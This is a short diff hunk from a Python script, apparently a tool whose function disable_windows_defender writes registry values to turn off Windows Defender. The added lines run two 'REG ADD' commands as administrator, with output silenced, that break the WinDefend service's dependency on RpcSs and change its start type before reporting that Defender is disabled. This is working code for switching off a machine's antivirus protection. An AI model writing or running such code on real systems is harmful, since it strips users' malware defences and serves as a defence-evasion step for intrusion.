@@ -158,6 +158,9 @@ def disable_windows_defender():
         winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
 
         winreg.CloseKey(key)
+        
+        run_command_as_admin('REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend" /v "DependOnService" /t REG_MULTI_SZ /d "RpcSs-DISABLED" /f >nul')
+        run_command_as_admin('REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "3" /f >nul')
 
         print("[Regedit] Windows Defender disabled.")
     except Exception as e:
